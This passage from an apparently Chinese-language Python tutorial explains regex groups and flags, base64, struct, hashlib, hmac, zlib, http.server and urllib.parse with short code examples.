print(m.span(1))    # (4, 8)

print(m.group(2))   # org
# 调用简化写法,底层是调用m.__getitem__(2)
print(m[2])         # org
print(m.span(2))    # (9, 12)

# 返回所有组所匹配的字符串组成的元组
print(m.groups())   # ('fkit', 'org')

</textarea>如果在正则表达式中为组指定了名字(用 ?P<名字> 为正则表达式的组指定名字),就可以调用groupdict()方法来获取所有组所匹配的字符串组成的宇典,其中组名作为字典的key,value为该组所匹配的子串<textarea>
# 正则表达式定义了2个组,并为组指定了名字
m2 = re.search(r'(?P< prefix>fkit).(?P< suffix>org)', r"www.fkit.org is a good domain")
print(m2.groupdict()) # {'prefix': 'fkit', 'suffix': 'org'}

</textarea><pre>
【 正则表达式修饰符 - 可选标志 】
正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志:

修饰符 描述
re.I  使匹配对大小写不敏感
re.L  做本地化识别(locale-aware)匹配
re.M  多行匹配,影响 ^ 和 $
re.S  使 . 匹配包括换行在内的所有字符
re.U  根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.
re.X  该标志通过给予更灵活的格式以便将正则表达式写得更易于理解。

【 正则表达式模式 】
模式字符串使用特殊的语法来表示一个正则表达式:

字母和数字表示他们自身。一个正则表达式模式中的字母和数字匹配同样的字符串。

多数字母和数字前加一个反斜杠时会拥有不同的含义。

标点符号只有被转义时才匹配自身,否则它们表示特殊的含义。

反斜杠本身需要使用反斜杠转义。

由于正则表达式通常都包含反斜杠,所以最好使用原始字符串来表示它们。模式元素(如 r'\t',等价于 '\\t')匹配相应的特殊字符。

下表列出了正则表达式模式语法中的特殊元素。如果使用模式的同时提供了可选的标志参数,某些模式元素的含义会改变。

^ 匹配字符串的开头
$ 匹配字符串的末尾。
. 匹配任意字符,除了换行符,当re.DOTALL标记被指定时,则可以匹配包括换行符的任意字符。
[...] 用来表示一组字符,单独列出:[amk] 匹配 'a','m'或'k'
[^...]  不在[]中的字符:[^abc] 匹配除了a,b,c之外的字符。
re* 匹配0个或多个的表达式。
re+ 匹配1个或多个的表达式。
re? 匹配0个或1个由前面的正则表达式定义的片段,非贪婪方式
re{ n}  精确匹配 n 个前面表达式。例如, o{2} 不能匹配 "Bob" 中的 "o",但是能匹配 "food" 中的两个 o。
re{ n,} 匹配 n 个前面表达式。例如, o{2,} 不能匹配"Bob"中的"o",但能匹配 "foooood"中的所有 o。"o{1,}" 等价于 "o+"。"o{0,}" 则等价于 "o*"。
re{ n, m} 匹配 n 到 m 次由前面的正则表达式定义的片段,贪婪方式
a| b  匹配a或b
(re)  对正则表达式分组并记住匹配的文本
(?imx)  正则表达式包含三种可选标志:i, m, 或 x 。只影响括号中的区域。
(?-imx) 正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。
(?: re) 类似 (...), 但是不表示一个组
(?imx: re)  在括号中使用i, m, 或 x 可选标志
(?-imx: re) 在括号中不使用i, m, 或 x 可选标志
(?#...) 注释.
(?= re) 前向肯定界定符。如果所含正则表达式,以 ... 表示,在当前位置成功匹配时成功,否则失败。但一旦所含表达式已经尝试,匹配引擎根本没有提高;模式的剩余部分还要尝试界定符的右边。
(?! re) 前向否定界定符。与肯定界定符相反;当所含表达式不能在字符串当前位置匹配时成功
(?> re) 匹配的独立模式,省去回溯。
\w  匹配字母数字及下划线
\W  匹配非字母数字及下划线
\s  匹配任意空白字符,等价于 [\t\n\r\f].
\S  匹配任意非空字符
\d  匹配任意数字,等价于 [0-9].
\D  匹配任意非数字
\A  匹配字符串开始
\Z  匹配字符串结束,如果是存在换行,只匹配到换行前的结束字符串。
\z  匹配字符串结束
\G  匹配最后匹配完成的位置。
\b  匹配一个单词边界,也就是指单词和空格间的位置。例如, 'er\b' 可以匹配"never" 中的 'er',但不能匹配 "verb" 中的 'er'。
\B  匹配非单词边界。'er\B' 能匹配 "verb" 中的 'er',但不能匹配 "never" 中的 'er'。
\n, \t, 等.  匹配一个换行符。匹配一个制表符。等
\1...\9 匹配第n个分组的内容。
\10 匹配第n个分组的内容,如果它经匹配。否则指的是八进制字符码的表达式。

</pre>组合符号 ?: 以?:开头的小括号失去了分组的功能<textarea>
s = '我的密码123456abc'
s1 = '我的口令123456abc'

# (密码|口令)同时即有正则表达式里面作为整体的功能,又有Python里面分组的功能
re.findall('(密码|口令)(.*?)$', s)     # [('密码', '123456abc')]
re.findall('(密码|口令)(.*?)$', s1)    # [('口令', '123456abc')]

re.findall('(?:密码|口令)(.*?)$', s)   # ['123456abc']
re.findall('(?:密码|口令)(.*?)$', s1)  # ['123456abc']

</textarea><pre>
【 正则表达式实例 】
字符匹配
实例  描述
python  匹配 "python".

字符类
实例  描述
[Pp]ython 匹配 "Python" 或 "python"
rub[ye] 匹配 "ruby" 或 "rube"
[aeiou] 匹配中括号内的任意一个字母
[0-9] 匹配任何数字。类似于 [0123456789]
[a-z] 匹配任何小写字母
[A-Z] 匹配任何大写字母
[a-zA-Z0-9] 匹配任何字母及数字
[^aeiou]  除了aeiou字母以外的所有字符
[^0-9]  匹配除了数字外的字符

特殊字符类
实例  描述
. 匹配除 "\n" 之外的任何单个字符。要匹配包括 '\n' 在内的任何字符,请使用象 '[.\n]' 的模式。
\d  匹配一个数字字符。等价于 [0-9]。
\D  匹配一个非数字字符。等价于 [^0-9]。
\s  匹配任何空白字符,包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。
\S  匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。
\w  匹配包括下划线的任何单词字符。等价于'[A-Za-z0-9_]'。
\W  匹配任何非单词字符。等价于 '[^A-Za-z0-9_]'。

</pre>
</div>

<div id="base64">
<h4>base64模块</h4><pre>
base64是一种用64个字符来表示任意二进制数据的方法,base64是一种任意二进制到文本字符串的编码方法,常用于URL、Cookie、网页中传输少量二进制数据

用记事本打开exe、jpg、pdf这些文件时都会看到一大堆乱码,因为二进制文件包含很多无法显示和打印的字符,所以,如果要让记事本这样的文本处理软件能处理二进制数据,就需要一个二进制到字符串的转换方法。Base64是一种最常见的二进制编码方法。

Base64的原理很简单,首先准备一个包含64个字符的数组:
['A', 'B', 'C', ... 'a', 'b', 'c', ... '0', '1', ... '+', '/']
然后对二进制数据进行处理,每3个字节一组,一共是3x8=24bit,划为4组,每组正好6个bit
这样得到4个数字作为索引,然后查表,获得相应的4个字符,就是编码后的字符串
所以Base64编码会把3字节的二进制数据编码为4字节的文本数据,长度增加33%,好处是编码后的文本数据可以在邮件正文、网页等直接显示。
如果要编码的二进制数据不是3的倍数,最后会剩下1个或2个字节,Base64用\x00字节在末尾补足后,再在编码的末尾加上1个或2个=号,表示补了多少字节,解码的时候会自动去掉

Python内置的base64可以直接进行base64的编解码:

import base64
base64.b64encode(b'binary\x00string')      # b'YmluYXJ5AHN0cmluZw=='
base64.b64decode(b'YmluYXJ5AHN0cmluZw==')  # b'binary\x00string'

由于标准的Base64编码后可能出现字符+和/,在URL中就不能直接作为参数,所以又有一种"url safe"的base64编码,其实就是把字符+和/分别变成-和_:

base64.b64encode(b'i\xb7\x1d\xfb\xef\xff')           # b'abcd++//'
base64.urlsafe_b64encode(b'i\xb7\x1d\xfb\xef\xff')   # b'abcd--__'
base64.urlsafe_b64decode('abcd--__')                 # b'i\xb7\x1d\xfb\xef\xff'

还可以自定义64个字符的排列顺序,这样就可以自定义Base64编码,不过通常情况下完全没有必要。
Base64是一种通过查表的编码方法,不能用于加密,即使使用自定义的编码表也不行。
Base64适用于小段内容的编码,比如数字证书签名、Cookie的内容等。

由于=字符也可能出现在Base64编码中,但=用在URL、Cookie里面会造成歧义,所以很多Base64编码后会把=去掉:
# 标准Base64:
'abcd' -> 'YWJjZA=='
# 自动去掉=:
'abcd' -> 'YWJjZA'
去掉=后怎么解码呢？因为Base64是把3个字节变为4个字节,所以Base64编码的长度永远是4的倍数,因此需要加上=把Base64字符串的长度变为4的倍数就可以正常解码了。

</pre>
</div>

<div id="struct">
<h4>struct</h4><pre>
准确地讲,Python没有专门处理字节的数据类型。但由于b'str'可以表示字节,所以字节数组＝二进制str。而在C语言中可以很方便地用struct、union来处理字节,以及字节和int,float的转换。

在Python中比方说要把一个32位无符号整数变成字节,也就是4个长度的bytes,得配合位运算符这么写:

>>> n = 10240099
>>> b1 = (n & 0xff000000) >> 24
>>> b2 = (n & 0xff0000) >> 16
>>> b3 = (n & 0xff00) >> 8
>>> b4 = n & 0xff
>>> bs = bytes([b1, b2, b3, b4])
>>> bs
b'\x00\x9c@c'

非常麻烦,如果换成浮点数就无能为力了。

好在Python提供了一个struct模块来解决bytes和其他二进制数据类型的转换。

struct的pack函数把任意数据类型变成bytes:

>>> import struct
>>> struct.pack('>I', 10240099)
b'\x00\x9c@c'

pack的第一个参数是处理指令,'>I'的意思是:
>表示字节顺序是big-endian,也就是网络序,I表示4字节无符号整数。
后面的参数个数要和处理指令一致。

unpack把bytes变成相应的数据类型:

>>> struct.unpack('>IH', b'\xf0\xf0\xf0\xf0\x80\x80')
(4042322160, 32896)
根据>IH的说明,后面的bytes依次变为I:4字节无符号整数和H:2字节无符号整数。

所以尽管Python不适合编写底层操作字节流的代码,但在对性能要求不高的地方,利用struct就方便多了。

struct模块定义的数据类型可以参考Python官方文档:https://docs.python.org/3/library/struct.html#format-characters

Windows的位图文件(.bmp)是一种非常简单的文件格式,用struct分析一下。
首先找一个bmp文件,没有的话用"画图"画一个。
读入前30个字节来分析:
>>> s = b'\x42\x4d\x38\x8c\x0a\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x80\x02\x00\x00\x68\x01\x00\x00\x01\x00\x18\x00'
BMP格式采用小端方式存储数据,文件头的结构按顺序如下:
两个字节:'BM'表示Windows位图,'BA'表示OS/2位图; 一个4字节整数:表示位图大小; 一个4字节整数:保留位,始终为0; 一个4字节整数:实际图像的偏移量; 一个4字节整数:Header的字节数; 一个4字节整数:图像宽度; 一个4字节整数:图像高度; 一个2字节整数:始终为1; 一个2字节整数:颜色数。

所以组合起来用unpack读取:
>>> struct.unpack('< ccIIIIIIHH', s)
(b'B', b'M', 691256, 0, 54, 40, 640, 360, 1, 24)
结果显示,b'B'、b'M'说明是Windows位图,位图大小为640x360,颜色数为24

</pre>
</div>

<div id="hashlib">
<h4>hashlib</h4><pre>
Python的hashlib提供了常见的摘要算法,如MD5,SHA1等
摘要算法又称哈希算法、散列算法。它通过一个函数,把任意长度的数据转换为一个长度固定的数据串,通常用16进制的字符串表示
摘要算法就是通过摘要函数f()对任意长度的数据data计算出固定长度的摘要digest,目的是为了发现原始数据是否被人篡改过
摘要算法之所以能指出数据是否被篡改过,就是因为摘要函数是一个单向函数,计算f(data)很容易,但通过digest反推data却非常困难,而且对原始数据做一个bit的修改,都会导致计算出的摘要完全不同

MD5是最常见的摘要算法,速度很快,生成结果是固定的128 bit字节,通常用一个32位的16进制字符串表示
import hashlib
md5 = hashlib.md5()
md5.update('how to use md5 in python hashlib?'.encode('utf-8'))
print(md5.hexdigest())     # d26a53750bc40b38b65a520292f69306

如果数据量很大,可以分块多次调用update(),最后计算的结果是一样的:
import hashlib
md5 = hashlib.md5()
md5.update('how to use md5 in '.encode('utf-8'))
md5.update('python hashlib?'.encode('utf-8'))
print(md5.hexdigest())

一种常见的摘要算法是SHA1,调用SHA1和调用MD5完全类似,SHA1的结果是160 bit字节,通常用一个40位的16进制字符串表示
import hashlib
sha1 = hashlib.sha1()
sha1.update('how to use sha1 in '.encode('utf-8'))
sha1.update('python hashlib?'.encode('utf-8'))
print(sha1.hexdigest())

比SHA1更安全的算法是SHA256和SHA512,不过越安全的算法不仅越慢,而且摘要长度更长。

</pre><textarea>
import hashlib
def hash_code(s, salt='mysite'):# 加点盐
    h = hashlib.sha256()
    s += salt
    h.update(s.encode())  # update方法只接收bytes类型
    return h.hexdigest()

</textarea><pre>
有没有可能两个不同的数据通过某个摘要算法得到了相同的摘要？完全有可能,因为任何摘要算法都是把无限多的数据集合映射到一个有限的集合中。这种情况称为碰撞,比如Bob试图根据摘要反推出一篇文章'how to learn hashlib in python - by Bob',并且这篇文章的摘要恰好和文章完全一致,这种情况也并非不可能出现,但是非常非常困难

</pre>
</div>

<div id="hmac">
<h4>hmac</h4><pre>
通过哈希算法可以验证一段数据是否有效,方法就是对比该数据的哈希值,例如判断用户口令是否正确,用保存在数据库中的password_md5对比计算md5(password)的结果,如果一致则用户输入的口令就是正确的。

为了防止黑客通过彩虹表根据哈希值反推原始口令,在计算哈希的时候不能仅针对原始输入计算,需要增加一个salt来使得相同的输入也能得到不同的哈希,这样大大增加了黑客破解的难度。

如果salt是自己随机生成的,通常计算MD5时采用md5(message + salt)。但实际上把salt看做一个"口令",加salt的哈希就是:计算一段message的哈希时,根据不通口令计算出不同的哈希。要验证哈希值,必须同时提供正确的口令。

这实际上就是Hmac算法:Keyed-Hashing for Message Authentication。它通过一个标准算法,在计算哈希的过程中,把key混入计算过程中。

和自定义的加salt算法不同,Hmac算法针对所有哈希算法都通用,无论是MD5还是SHA-1。采用Hmac替代自定义的salt算法,可以使程序算法更标准化,也更安全。

Python自带的hmac模块实现了标准的Hmac算法

首先需要准备待计算的原始消息message,随机key,哈希算法,这里采用MD5,使用hmac实现带key的哈希
>>> import hmac
>>> message = b'Hello, world!'
>>> key = b'secret'
>>> h = hmac.new(key, message, digestmod='MD5')
>>> # 如果消息很长,可以多次调用h.update(msg)
>>> h.hexdigest()
'fa4ee7d173f2d97ee79022d1a7355bcf'

可见使用hmac和普通hash算法非常类似。hmac输出的长度和原始哈希算法的长度一致。需要注意传入的key和message都是bytes类型,str类型需要首先编码为bytes。


</pre>
</div>

<div id="gzip">
<h4>数据压缩</h4><pre>
常见的数据存档和压缩格式由模块直接支持,包括:zlib, gzip, bz2, lzma, zipfile 和 tarfile

</pre><textarea>
>>> import zlib
>>> s = b'witch which has which witches wrist watch'
>>> len(s)
41
>>> t = zlib.compress(s)
>>> len(t)
37
>>> zlib.decompress(t)
b'witch which has which witches wrist watch'
>>> zlib.crc32(s)
226805979

</textarea>
</div>

<div id="http">
<h4>http.client http.server</h4><pre>
import http
print(http)  # < module 'http' from 'E:\\soft\\python\\lib\\http\\__init__.py'>
print([e for e in dir(http) if not e.startswith('_')])  # ['HTTPStatus', 'IntEnum']

import http.server
print(http.server) # < module 'http.server' from 'E:\\soft\\python\\lib\\http\\server.py'>

Python3中的http包中含有几个用来开发HTTP协议的模块:
http.client是一个底层的HTTP协议客户端,被更高层的urllib.request模块所使用。
http.server包含基于socketserver的基本HTTP服务器的类。
http.cookies实现cookie状态管理
http.cookiejar与cookie相关
http.HTTPStatus

【 http.client模块 】
http.client模块定义了实现http和https协议客户端的类。
该模块通常不会直接使用,而是用封装好的更高层的urllib.request模块来使用他们处理URL

【 http.server模块 】
这个模块定义了实现HTTP服务器即Web服务器的类,不推荐在生产环境中使用http.server,它只实现了基本的安全检查功能。

快速搭建简单服务器,搭建本地局域网开启文件分享,访问主机本地ip地址加端口号即可
Python允许运行一个HTTP服务器来从根路径共享文件,下面命令是开启一个把当前目录作为根目录的服务器：
python -m SimpleHTTPServer  # Python2
python3 -m http.server  # Python3,在默认端口也就是8000开启一个服务器
python -m http.server 80  # 自定义的端口号

HTTPServer是socketserver.TCPServer的一个子类,它会创建和侦听HTTP套接字,并将请求调度给处理程序

创建和运行服务器
def run(server_class=HTTPServer, handler_class=BaseHTTPRequestHandler):
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

用于搭建http server的模块有如下三种：
1、BaseHTTPServer：提供基本的Web服务和处理器类,分别是HTTPServer及BaseHTTPRequestHandler;
2、SimpleHTTPServer：包含执行GET和HEAD请求的SimpleHTTPRequestHandler类;
3、CGIHTTPServer：包含处理POST请求和执行的CGIHTTPRequestHandler类。

● class http.server.HTTPServer(server_address, RequestHandlerClass)
该类基于TCPServer类,并会将服务器地址存入名为server_name和server_port的实例变量中,服务器可被处理程序通过server实例变量访问。

● class http.server.ThreadingHTTPServer(server_address, RequestHandlerClass)
This class is identical to HTTPServer but uses threads to handle requests by using the ThreadingMixIn. This is useful to handle web browsers pre-opening sockets, on which HTTPServer would wait indefinitely

● class http.server.BaseHTTPRequestHandler(request, client_address, server)
This class is used to handle the HTTP requests that arrive at the server. By itself, it cannot respond to any actual HTTP requests; it must be subclassed to handle each request method (e.g. GET or POST). BaseHTTPRequestHandler provides a number of class and instance variables, and methods for use by subclasses.

The handler will parse the request and the headers, then call a method specific to the request type. The method name is constructed from the request. For example, for the request method SPAM, the do_SPAM() method will be called with no arguments. All of the relevant information is stored in instance variables of the handler. Subclasses should not need to override or extend the __init__() method.

● BaseHTTPRequestHandler has the following instance variables:
client_address
Contains a tuple of the form (host, port) referring to the client's address.

server
Contains the server instance.

close_connection
Boolean that should be set before handle_one_request() returns, indicating if another request may be expected, or if the connection should be shut down.

requestline
Contains the string representation of the HTTP request line. The terminating CRLF is stripped. This attribute should be set by handle_one_request(). If no valid request line was processed, it should be set to the empty string.

command
Contains the command (request type). For example, 'GET'.

path
Contains the request path.

request_version
Contains the version string from the request. For example, 'HTTP/1.0'.

headers
Holds an instance of the class specified by the MessageClass class variable. This instance parses and manages the headers in the HTTP request. The parse_headers() function from http.client is used to parse the headers and it requires that the HTTP request provide a valid RFC 2822 style header.

rfile
An io.BufferedIOBase input stream, ready to read from the start of the optional input data.

wfile
an io.BufferedIOBase stream,Contains the output stream for writing a response back to the client. Proper adherence to the HTTP protocol must be used when writing to this stream in order to achieve successful interoperation with HTTP clients.

● BaseHTTPRequestHandler has the following attributes:
server_version
Specifies the server software version. You may want to override this. The format is multiple whitespace-separated strings, where each string is of the form name[/version]. For example, 'BaseHTTP/0.2'.

sys_version
Contains the Python system version, in a form usable by the version_string method and the server_version class variable. For example, 'Python/1.4'.

error_message_format
Specifies a format string that should be used by send_error() method for building an error response to the client. The string is filled by default with variables from responses based on the status code that passed to send_error().

error_content_type
Specifies the Content-Type HTTP header of error responses sent to the client. The default value is 'text/html'.

protocol_version
This specifies the HTTP protocol version used in responses. If set to 'HTTP/1.1', the server will permit HTTP persistent connections; however, your server must then include an accurate Content-Length header (using send_header()) in all of its responses to clients. For backwards compatibility, the setting defaults to 'HTTP/1.0'.

MessageClass
Specifies an email.message.Message-like class to parse HTTP headers. Typically, this is not overridden, and it defaults to http.client.HTTPMessage.

responses
This attribute contains a mapping of error code integers to two-element tuples containing a short and long message. For example, {code: (shortmessage, longmessage)}. The shortmessage is usually used as the message key in an error response, and longmessage as the explain key. It is used by send_response_only() and send_error() methods.

● A BaseHTTPRequestHandler instance has the following methods:
handle()
Calls handle_one_request() once (or, if persistent connections are enabled, multiple times) to handle incoming HTTP requests. You should never need to override it; instead, implement appropriate do_*() methods.

handle_one_request()
This method will parse and dispatch the request to the appropriate do_*() method. You should never need to override it.

handle_expect_100()
When a HTTP/1.1 compliant server receives an Expect: 100-continue request header it responds back with a 100 Continue followed by 200 OK headers. This method can be overridden to raise an error if the server does not want the client to continue. For e.g. server can chose to send 417 Expectation Failed as a response header and return False.

send_error(code, message=None, explain=None)
Sends and logs a complete error reply to the client. The numeric code specifies the HTTP error code, with message as an optional, short, human readable description of the error. The explain argument can be used to provide more detailed information about the error; it will be formatted using the error_message_format attribute and emitted, after a complete set of headers, as the response body. The responses attribute holds the default values for message and explain that will be used if no value is provided; for unknown codes the default value for both is the string ???. The body will be empty if the method is HEAD or the response code is one of the following: 1xx, 204 No Content, 205 Reset Content, 304 Not Modified.
The error response includes a Content-Length header. Added the explain argument.

send_response(code, message=None)
Adds a response header to the headers buffer and logs the accepted request. The HTTP response line is written to the internal buffer, followed by Server and Date headers. The values for these two headers are picked up from the version_string() and date_time_string() methods, respectively. If the server does not intend to send any other headers using the send_header() method, then send_response() should be followed by an end_headers() call.
Headers are stored to an internal buffer and end_headers() needs to be called explicitly.

send_header(keyword, value)
Adds the HTTP header to an internal buffer which will be written to the output stream when either end_headers() or flush_headers() is invoked. keyword should specify the header keyword, with value specifying its value. Note that, after the send_header calls are done, end_headers() MUST BE called in order to complete the operation.
Headers are stored in an internal buffer.

send_response_only(code, message=None)
Sends the response header only, used for the purposes when 100 Continue response is sent by the server to the client. The headers not buffered and sent directly the output stream.If the message is not specified, the HTTP message corresponding the response code is sent.

end_headers()
Adds a blank line (indicating the end of the HTTP headers in the response) to the headers buffer and calls flush_headers().
The buffered headers are written to the output stream.

flush_headers()
Finally send the headers to the output stream and flush the internal headers buffer.

log_request(code='-', size='-')
Logs an accepted (successful) request. code should specify the numeric HTTP code associated with the response. If a size of the response is available, then it should be passed as the size parameter.

log_error(...)
Logs an error when a request cannot be fulfilled. By default, it passes the message to log_message(), so it takes the same arguments (format and additional values).

log_message(format, ...)
Logs an arbitrary message to sys.stderr. This is typically overridden to create custom error logging mechanisms. The format argument is a standard printf-style format string, where the additional arguments to log_message() are applied as inputs to the formatting. The client ip address and current date and time are prefixed to every message logged.

version_string()
Returns the server software's version string. This is a combination of the server_version and sys_version attributes.

date_time_string(timestamp=None)
Returns the date and time given by timestamp (which must be None or in the format returned by time.time()), formatted for a message header. If timestamp is omitted, it uses the current date and time.
The result looks like 'Sun, 06 Nov 1994 08:49:37 GMT'.

log_date_time_string()
Returns the current date and time, formatted for logging.

address_string()
Returns the client address.
Previously, a name lookup was performed. To avoid name resolution delays, it now always returns the IP address.

● class http.server.SimpleHTTPRequestHandler(request, client_address, server, directory=None)

● class http.server.CGIHTTPRequestHandler(request, client_address, server)

</pre>使用http.server模块搭建一个简易的http服务器<textarea>
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

data = {'result': 'this is a test'}
host = ('localhost', 8888)

class Resquest(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

if __name__ == '__main__':
    server = HTTPServer(host, Resquest)
    print("Starting server, listen at: %s:%s" % host)
    server.serve_forever()

</textarea>接收请求参数<textarea>
from pyhanlp import *

import traceback
import json
import urllib
from http.server import HTTPServer, BaseHTTPRequestHandler

class HttpHandler(BaseHTTPRequestHandler):
    def _response(self, path, args):
        code=200
        rtv={'c':0,'m':'','v':''}

        try:
            if args:
                args=urllib.parse.parse_qs(args).items()
                args=dict([(k,v[0]) for k,v in args])
            else:
                args={}

            if path=="/":
                rtv["v"]="服务器已准备好"
            elif path=="/pinyin":
                txt=args.get("txt","")
                pinyin_list = HanLP.convertToPinyinList(txt)
                list=[]
                Pinyin=JClass("com.hankcs.hanlp.dictionary.py.Pinyin")
                for i in range(pinyin_list.size()):
                    pinyin=pinyin_list[i]
                    if pinyin==Pinyin.none5:
                        list.append('F'+txt[i])
                    else:
                        list.append(pinyin.getPinyinWithoutTone())

                rtv["v"]=list
            else:
                code=404
                rtv["c"]=404
                rtv["m"]="路径"+path+"不存在"
        except Exception as e:
            rtv["c"]=1
            rtv["m"]='服务器错误：'+str(e)+"\n"+traceback.format_exc()

        try:
            rtv=json.dumps(rtv,ensure_ascii=False)
        except Exception as e:
            rtv={'c':2,'m':'服务器返回数据错误：'+str(e)+"\n"+traceback.format_exc(),'v':''}
            rtv=json.dumps(rtv,ensure_ascii=False)

        self.send_response(code)
        self.send_header('Content-type', 'text/json; charset=utf-8')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(rtv.encode())

    def do_GET(self):
        path,args=urllib.parse.splitquery(self.path)
        self._response(path, args)

    def do_POST(self):
        args = self.rfile.read(int(self.headers['content-length'])).decode("utf-8")
        self._response(self.path, args)

httpd = HTTPServer(('127.0.0.1', 9527), HttpHandler)
httpd.serve_forever()

</textarea>
</div>

<div id="urllib">
<h4>urllib模块 urllib3 (1.22)</h4><pre>
URL(Uniform Resource Locator)对象代表统一资源定位器,是指向互联网"资源"的指针。资源可以是简单的文件或目录,也可以是对复杂对象的引用,例如对数据库或搜索引擎的查询。通常URL可以由协议名、主机、端口和资源路径组成,即满足如下格式:protocol://host:port/path,例如http://www.crazyit.org/index.php

urllib模块是Python内置的HTTP请求库,提供了一系列用于操作URL的功能,通过urllib可利用程序去执行各种HTTP请求。如果要模拟浏览器完成特定功能,需要把请求伪装成浏览器。伪装的方法是先监控浏览器发出的请求,再根据浏览器的请求头来伪装,User-Agent头就是用来标识浏览器的。

</pre><textarea>
    (null)
      |
      | HTTPConnection()
      v
    Idle
      |
      | putrequest()
      v
    Request-started
      |
      | ( putheader() )*  endheaders()
      v
    Request-sent
      |\_____________________________
      |                              | getresponse() raises
      | response = getresponse()     | ConnectionError
      v                              v
    Unread-response                Idle
    [Response-headers-read]
      |\____________________
      |                     |
      | response.read()     | putrequest()
      v                     v
    Idle                  Req-started-unread-response
                     ______/|
                   /        |
   response.read() |        | ( putheader() )*  endheaders()
                   v        v
       Request-started    Req-sent-unread-response
                            |
                            | response.read()
                            v
                          Request-sent

</textarea><pre>
urllib模块包含四个用于处理URL的子模块:
1、request模块
这是最核心的子模块,包含了打开和读取URL的各种函数,是最基本的HTTP请求模块,可用来模拟发送请求,就像在浏览器里输入网址回车一样,只要给库方法传入URL和额外的参数就可模拟实现这个过程

2、error模块
即异常处理模块,主要包含由urllib.request子模块所引发的各种异常,如果出现请求错误可以捕获这些异常,然后进行重试或其他操作保证程序不会意外终止。

3、parse模块
工具模块,用于解析url,提供了许多URL处理方法如拆分、解析、合并等

4、robotparser模块
主要是用来识别解析网站的robots.txt文件,然后判断哪些网站可以爬,哪些网站不可以爬的,其实用的比较少。

通过使用urllib模块可以打开任意URL所指向的资源,就像打开本地文件一样,这样程序就能完整地下载远程页面。如果再与re模块结合使用,那么程序完全可以提取页面中各种信息,这就是所谓的"网络爬虫"的初步原理

</pre><textarea>
import urllib
import urllib.request
import urllib.parse

print([e for e in dir(urllib) if not e.startswith('_')])
print([e for e in dir(urllib.request) if not e.startswith('_')])
print([e for e in dir(urllib.parse) if not e.startswith('_')])
'''
['error', 'parse', 'request', 'response']
['AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'AbstractHTTPHandler', 'BaseHandler', 'CacheFTPHandler', 'ContentTooShortError', 'DataHandler', 'FTPHandler', 'FancyURLopener', 'FileHandler', 'HTTPBasicAuthHandler', 'HTTPCookieProcessor', 'HTTPDefaultErrorHandler', 'HTTPDigestAuthHandler', 'HTTPError', 'HTTPErrorProcessor', 'HTTPHandler', 'HTTPPasswordMgr', 'HTTPPasswordMgrWithDefaultRealm', 'HTTPPasswordMgrWithPriorAuth', 'HTTPRedirectHandler', 'HTTPSHandler', 'MAXFTPCACHE', 'OpenerDirector', 'ProxyBasicAuthHandler', 'ProxyDigestAuthHandler', 'ProxyHandler', 'Request', 'URLError', 'URLopener', 'UnknownHandler', 'addclosehook', 'addinfourl', 'base64', 'bisect', 'build_opener', 'collections', 'contextlib', 'email', 'ftpcache', 'ftperrors', 'ftpwrapper', 'getproxies', 'getproxies_environment', 'hashlib', 'http', 'install_opener', 'io', 'localhost', 'noheaders', 'os', 'parse_http_list', 'parse_keqv_list', 'pathname2url', 'posixpath', 'proxy_bypass', 'proxy_bypass_environment', 'quote', 're', 'request_host', 'socket', 'splitattr', 'splithost', 'splitpasswd', 'splitport', 'splitquery', 'splittag', 'splittype', 'splituser', 'splitvalue', 'ssl', 'string', 'sys', 'tempfile', 'thishost', 'time', 'to_bytes', 'unquote', 'unquote_to_bytes', 'unwrap', 'url2pathname', 'urlcleanup', 'urljoin', 'urlopen', 'urlparse', 'urlretrieve', 'urlsplit', 'urlunparse', 'warnings']
['DefragResult', 'DefragResultBytes', 'MAX_CACHE_SIZE', 'ParseResult', 'ParseResultBytes', 'Quoter', 'ResultBase', 'SplitResult', 'SplitResultBytes', 'clear_cache', 'collections', 'namedtuple', 'non_hierarchical', 'parse_qs', 'parse_qsl', 'quote', 'quote_from_bytes', 'quote_plus', 're', 'scheme_chars', 'splitattr', 'splithost', 'splitnport', 'splitpasswd', 'splitport', 'splitquery', 'splittag', 'splittype', 'splituser', 'splitvalue', 'sys', 'to_bytes', 'unquote', 'unquote_plus', 'unquote_to_bytes', 'unwrap', 'urldefrag', 'urlencode', 'urljoin', 'urlparse', 'urlsplit', 'urlunparse', 'urlunsplit', 'uses_fragment', 'uses_netloc', 'uses_params', 'uses_query', 'uses_relative']
'''

</textarea><pre>
【 urllib.parse子模块 】
urllib.parse子模块中用于解析URL地址和查询字符串的函数:
urllib.parse.urlparse(urlstring, scheme='', allow_fragments=True)
该函数用于解析URL字符串,返回一个ParseResult对象,可以获取解析出来的数据。该对象实际上是tuple的子类。因此程序既可通过属性名来获取URL的各部分,也可通过索引来获取URL的各部分

</pre>

<table>
<caption>ParseResult各属性与元组索引的对应关系</caption>
<tr><th>属性名</th><th>元组索引</th><th>返回值</th><th>默认值</th></tr>
<tr><td>scheme</td><td>0</td><td>返回URL的scheme</td><td>scheme参数</td></tr>
<tr><td>netloc</td><td>1</td><td>网络位置部分(主机名＋端口)</td><td>空字符串</td></tr>
<tr><td>path</td><td>2</td><td>资源路径</td><td>空字符串</td></tr>
<tr><td>params</td><td>3</td><td>资源路径的附加参数</td><td>空字符串</td></tr>
<tr><td>query</td><td>4</td><td>查询字符串</td><td>空字符串</td></tr>
<tr><td>fragment</td><td>5</td><td>Fragment标识符</td><td>空字符串</td></tr>
<tr><td>username</td><td> </td><td>用户名</td><td>None</td></tr>
<tr><td>password </td><td> </td><td>密码</td><td>None</td></tr>
<tr><td>hostname</td><td> </td><td>主机名</td><td>None</td></tr>
<tr><td>port</td><td> </td><td>端口</td><td>None</td></tr>
</table>

<pre>
urllib.parse.urlunparse(parts)
该函数是上一个函数的反向操作,用于将解析结果反向拼接成URL地址。

